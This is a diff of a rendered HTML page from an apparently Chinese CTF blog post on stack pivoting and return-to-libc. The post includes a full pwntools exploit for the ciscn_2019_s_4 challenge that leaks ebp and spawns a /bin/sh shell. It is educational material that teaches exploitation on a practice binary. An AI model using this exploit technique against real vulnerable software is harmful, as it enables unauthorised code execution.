@@ -225,7 +225,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.4k 字
+          3.6k 字
         
       </span>
     
@@ -236,7 +236,7 @@
         
         
         
-          29 分钟
+          30 分钟
         
       </span>
     
@@ -283,107 +283,41 @@
 <h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>​	既然无法将shellcode注入到数据段上并执行，那就只能修改IP指向已有的代码部分。例如采用技术 Return-to-libc,修改当前的EIP指针向已有的库函数，并且传递相应的参数。（<strong>如果在开启了NX的情况下如何进行单字节溢出的利用</strong>）。</p>
 <p><strong>least privilege &amp; seteuid(getuid())</strong></p>
 <p>​	在实际的应用程序中会采用最小特权原则，并且能够进行权限继承，因此，攻击者能够获取与当前程序相同权限的shell，但在程序中可以通过setuid的方式主动放弃不必要的权限。因此，如果想要获得更高权限的shell需要构造以下调用序列：</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">seteuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
-<span class="token function">system</span><span class="token punctuation">(</span>“sh”<span class="token punctuation">)</span>
-<span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">seteuid(<span class="hljs-number">0</span>)<br>system(“sh”)<br><span class="hljs-built_in">exit</span>()<br></code></pre></td></tr></tbody></table></figure>
 
 <p>但是存在问题，setuid的参数是\x00，但是strcpy在遇到\x00后会自动停止，并不能将其拷贝到栈中。因此需要使用到两个技术：</p>
 <ul>
 <li>ESP lifting (ESP抬升)</li>
 <li>Frame Faking(栈帧伪造)</li>
-<li><span class="exturl" data-url="aHR0cHM6Ly9zcGxvaXRmdW4ud29yZHByZXNzLmNvbS8yMDE1LzA1LzA4L2J5cGFzc2luZy1ueC1iaXQtdXNpbmctY2hhaW5lZC1yZXR1cm4tdG8tbGliYy8=">https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/</span></li>
+<li><a target="_blank" rel="noopener" href="https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/">https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/</a></li>
 </ul>
 <p>其实二者是一个东西，本质是和之前的单字节溢出，利用leave | ret指令实现栈抬升相同，主要使用leave和ret两个指令：</p>
-<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">leave:
-        move esp,ebp ; 恢复栈顶指针
-        pop ebp ;(esp=esp+4)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">leave:<br>        move esp,ebp ; 恢复栈顶指针<br>        pop ebp ;(esp=esp+4)<br></code></pre></td></tr></tbody></table></figure>
 
 <p>栈迁移的本质是重新构造出进入jmp system_got 时的栈情况，最终目的是将esp迁移过来。但是需要注意的一点是，一次leave ret指令智能将esp抬升上去，并不能对ebp做任何操作，因此需要进行两次leave ret指令，第一个ret不能返回到system而是找到gadget：</p>
-<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">esp,ebp --&gt; old_ebp
-        --&gt; ret_addr
-        --&gt; arg1 :此处是指向system字符串参数的指针
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">esp,ebp --&gt; old_ebp<br>        --&gt; ret_addr<br>        --&gt; arg1 :此处是指向system字符串参数的指针<br><br></code></pre></td></tr></tbody></table></figure>
 
 <hr>
-<h3 id="例题-ciscn-2019-s-4"><a href="#例题-ciscn-2019-s-4" class="headerlink" title="例题 ciscn_2019_s_4"></a>例题 ciscn_2019_s_4</h3><p><img data-src="https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202305042048537.png" srcset="/img/loading.gif" lazyload alt="image-20230504193243253"></p>
+<h3 id="例题-ciscn-2019-s-4"><a href="#例题-ciscn-2019-s-4" class="headerlink" title="例题 ciscn_2019_s_4"></a>例题 ciscn_2019_s_4</h3><p><img src="https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202305042048537.png" srcset="/img/loading.gif" lazyload alt="image-20230504193243253"></p>
 <p>题目很简单，buff的长度有40，但是read函数长度有48，多出八个字节能够溢出。总体思路是进行rop，但是由于溢出长度有限，在vul函数退出后进行了清理堆栈的操作，导致后面的内容不可控，因此需要进行栈迁移，将更多的栈部分可控。</p>
-<p><img data-src="https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202305042048754.png" srcset="/img/loading.gif" lazyload alt="image-20230504193612815"></p>
+<p><img src="https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202305042048754.png" srcset="/img/loading.gif" lazyload alt="image-20230504193612815"></p>
 <p>在32位程序下，栈按照四个字节进行对齐，因此溢出的八个字节能够覆盖ebp指针和ret地址。一个函数在执行leave | ret之前的状态如下：</p>
-<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">esp -&gt; [???] ; 此时的esp指针可能会指向栈中的任意位置
-...
-ebp -&gt; [old_ebp] ; 这里是记录父函数的栈基址，由刚进子函数的时候push ebp指令存储至此
-	   [ret_add] ; 记录当前的返回地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">esp -&gt; [???] ; 此时的esp指针可能会指向栈中的任意位置<br>...<br>ebp -&gt; [old_ebp] ; 这里是记录父函数的栈基址，由刚进子函数的时候push ebp指令存储至此<br>	   [ret_add] ; 记录当前的返回地址<br></code></pre></td></tr></tbody></table></figure>
 
 <p>上述经过栈溢出后，old_ebp和ret_addr被覆盖为new_ebp, new_ret_addr,在执行leave ret指令后的栈空间：</p>
-<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">inst: 
-	mov esp,ebp
-----------------------------------------------
-ebp,esp -&gt; [new_ebp] ; 这里是记录父函数的栈基址，由刚进子函数的时候push ebp指令存储至此
-	   [new_ret_addr] ; 记录当前的返回地址
-----------------------------------------------
-inst: 
-	pop ebp
-----------------------------------------------
-ebp = buff_(new_ebp) ; 指向新的栈位置,这里位置的构造进行后续讨论
-esp -&gt; [new_ret_addr] ; 记录当前的返回地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">inst: <br>	mov esp,ebp<br>----------------------------------------------<br>ebp,esp -&gt; [new_ebp] ; 这里是记录父函数的栈基址，由刚进子函数的时候push ebp指令存储至此<br>	   [new_ret_addr] ; 记录当前的返回地址<br>----------------------------------------------<br>inst: <br>	pop ebp<br>----------------------------------------------<br>ebp = buff_(new_ebp) ; 指向新的栈位置,这里位置的构造进行后续讨论<br>esp -&gt; [new_ret_addr] ; 记录当前的返回地址<br></code></pre></td></tr></tbody></table></figure>
 
 <p>但是注意此时还并没有完全将栈迁移出去。此时的esp还在低位，如果直接将new_ret_addr覆盖为system，则此时索引的arg参数是esp + 0x4（因为在执行过call函数后，压入了call system的下一个地址），比esp地址更高的位置显然是不可控的（注意这里，栈是向低地址增长的，新函数的参数由父函数压入，因此在高地址）。需要将esp进行同样的抬升。因此需要再次执行leave ret指令继续修改。</p>
-<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">inst: 
-	mov esp,ebp
-----------------------------------------------
-ebp,esp = buff_ ; 执行结束后完成将esp的抬升
-----------------------------------------------
-inst: 
-	pop ebp
-----------------------------------------------
-esp = buff_ ;  
-ebp = Any ;   pop ebp执行后会改变ebp，但是对后续的利用来说，ebp指向哪里并没有影响,因为子函数只基于esp进行索引<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">inst: <br>	mov esp,ebp<br>----------------------------------------------<br>ebp,esp = buff_ ; 执行结束后完成将esp的抬升<br>----------------------------------------------<br>inst: <br>	pop ebp<br>----------------------------------------------<br>esp = buff_ ;  <br>ebp = Any ;   pop ebp执行后会改变ebp，但是对后续的利用来说，ebp指向哪里并没有影响,因为子函数只基于esp进行索引<br></code></pre></td></tr></tbody></table></figure>
 
 <p>所以该题目的思路也逐渐清晰，就是要通过溢出将esp抬升。抬升前需要指导buff的地址，也就是esp应该抬升到哪里去，本题还需要用到的部分是<strong>printf</strong>本身在输出的时候接收一个字符串指针，并自动执行到\x00的位置结束。因此可以利用该机制进行ebp的泄露。</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ciscn_s_4'</span><span class="token punctuation">)</span>
-elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./ciscn_s_4'</span><span class="token punctuation">)</span>
-context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>
-<span class="token triple-quoted-string string">'''
-	静态查找leave ret指令地址
-'''</span>
-system_addr <span class="token operator">=</span> <span class="token number">0x8048400</span>
-leave_ret_addr<span class="token operator">=</span><span class="token number">0x080484B8</span>
-ret_addr <span class="token operator">=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
-<span class="token triple-quoted-string string">'''
-	第一次直接构造和buff长度相同的输入，printf时会输出后续内容
-'''</span>
-payload <span class="token operator">=</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x28</span>
-sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name?\n'</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-<span class="token triple-quoted-string string">'''
-	接收泄露的ebp输出
-'''</span>
-sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token punctuation">)</span>
-ebp <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token triple-quoted-string string">'''
-	这里泄露出ebp后只能做基于ebp的偏移，将ebp偏移到buff的位置。当程序的控制流的确定时，其栈帧的相对位置也是确定的，因此可以直接在动态调试的过程中获取ebp和buff的位置，直接相减得到偏移量为0x38
-'''</span>
-fake_ebp <span class="token operator">=</span> ebp <span class="token operator">-</span><span class="token number">0x38</span>
-<span class="token triple-quoted-string string">'''
-	构造第二次输入的payload
-'''</span>
-payload<span class="token operator">=</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token comment"># ret addr</span>
-payload<span class="token operator">+=</span><span class="token string">b'aaaa'</span> <span class="token comment"># junk ret addr 用于模拟call system时的压入返回值操作</span>
-payload<span class="token operator">+=</span>p32<span class="token punctuation">(</span>fake_ebp<span class="token operator">+</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment"># 指向system参数的指针，这里注意，system传入的不是一个字符串而是一个指针</span>
-payload<span class="token operator">+=</span><span class="token string">b'/bin/sh\x00'</span> <span class="token comment"># payload</span>
-payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">b'A'</span><span class="token punctuation">)</span> <span class="token comment"># 这里对当前的栈进行补齐操作</span>
-payload<span class="token operator">+=</span>p32<span class="token punctuation">(</span>fake_ebp<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment"># 该位置会作为新的栈顶更高的位置，在执行第二次leave ret指令时会进行一次pop ebp</span>
-payload<span class="token operator">+=</span>p32<span class="token punctuation">(</span>leave_ret_addr<span class="token punctuation">)</span> <span class="token comment"># 填入leave ret返回值</span>
-sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = process(<span class="hljs-string">'./ciscn_s_4'</span>)<br>elf=ELF(<span class="hljs-string">'./ciscn_s_4'</span>)<br>context(os = <span class="hljs-string">'linux'</span>,arch = <span class="hljs-string">'amd64'</span>,log_level = <span class="hljs-string">'debug'</span>)<br><span class="hljs-string">'''</span><br><span class="hljs-string">	静态查找leave ret指令地址</span><br><span class="hljs-string">'''</span><br>system_addr = <span class="hljs-number">0x8048400</span><br>leave_ret_addr=<span class="hljs-number">0x080484B8</span><br>ret_addr = p32(system_addr)<br><span class="hljs-string">'''</span><br><span class="hljs-string">	第一次直接构造和buff长度相同的输入，printf时会输出后续内容</span><br><span class="hljs-string">'''</span><br>payload =<span class="hljs-string">b'a'</span> * <span class="hljs-number">0x28</span><br>sh.recvuntil(<span class="hljs-string">'name?\n'</span>)<br>sh.send(payload)<br><span class="hljs-string">'''</span><br><span class="hljs-string">	接收泄露的ebp输出</span><br><span class="hljs-string">'''</span><br>sh.recvuntil(<span class="hljs-string">'a'</span>*<span class="hljs-number">0x28</span>)<br>ebp = u32(sh.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b'\x00'</span>))<br><span class="hljs-string">'''</span><br><span class="hljs-string">	这里泄露出ebp后只能做基于ebp的偏移，将ebp偏移到buff的位置。当程序的控制流的确定时，其栈帧的相对位置也是确定的，因此可以直接在动态调试的过程中获取ebp和buff的位置，直接相减得到偏移量为0x38</span><br><span class="hljs-string">'''</span><br>fake_ebp = ebp -<span class="hljs-number">0x38</span><br><span class="hljs-string">'''</span><br><span class="hljs-string">	构造第二次输入的payload</span><br><span class="hljs-string">'''</span><br>payload=p32(system_addr) <span class="hljs-comment"># ret addr</span><br>payload+=<span class="hljs-string">b'aaaa'</span> <span class="hljs-comment"># junk ret addr 用于模拟call system时的压入返回值操作</span><br>payload+=p32(fake_ebp+<span class="hljs-number">12</span>) <span class="hljs-comment"># 指向system参数的指针，这里注意，system传入的不是一个字符串而是一个指针</span><br>payload+=<span class="hljs-string">b'/bin/sh\x00'</span> <span class="hljs-comment"># payload</span><br>payload=payload.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b'A'</span>) <span class="hljs-comment"># 这里对当前的栈进行补齐操作</span><br>payload+=p32(fake_ebp-<span class="hljs-number">4</span>) <span class="hljs-comment"># 该位置会作为新的栈顶更高的位置，在执行第二次leave ret指令时会进行一次pop ebp</span><br>payload+=p32(leave_ret_addr) <span class="hljs-comment"># 填入leave ret返回值</span><br>sh.send(payload)<br>sh.interactive()<br>exit()<br></code></pre></td></tr></tbody></table></figure>
 
 <p>注意两个关键位置：</p>
 <p><strong>payload+=p32(fake_ebp+12) # 指向system参数的指针，这里注意，system传入的不是一个字符串而是一个指针</strong></p>
 <p><strong>payload+=p32(fake_ebp-4) # 该位置会作为新的栈顶更高的位置，在执行第二次leave ret指令时会进行一次pop ebp</strong></p>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NlYV90aW1lL2FydGljbGUvZGV0YWlscy8xMDYxNDI5NzE=">https://blog.csdn.net/sea_time/article/details/106142971</span></p>
-<p><span class="exturl" data-url="aHR0cHM6Ly9zcGxvaXRmdW4ud29yZHByZXNzLmNvbS8yMDE1LzA1LzA4L2J5cGFzc2luZy1ueC1iaXQtdXNpbmctY2hhaW5lZC1yZXR1cm4tdG8tbGliYy8=">https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/</span></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/sea_time/article/details/106142971">https://blog.csdn.net/sea_time/article/details/106142971</a></p>
+<p><a target="_blank" rel="noopener" href="https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/">https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/</a></p>
 
                 
               </div>
